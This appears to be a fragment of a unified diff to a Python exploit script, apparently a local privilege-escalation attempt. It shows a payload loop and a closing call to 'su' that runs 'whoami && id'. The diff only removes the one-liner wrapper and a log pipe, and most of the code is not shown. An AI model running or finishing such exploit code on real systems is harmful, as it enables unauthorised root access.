@@ -1,4 +1,3 @@
-/tmp/python-standalone/python/bin/python3 -c '
 import os, zlib, socket, sys
 print("Starting exploit...")
 
@@ -32,4 +31,3 @@ for i in range(0, len(payload), 4):
 
 print("[+] Exploit finished. Trying su...")
 os.system("su -c \"whoami && id\"")
-' 2>&1 | tee /tmp/exploit_debug.log
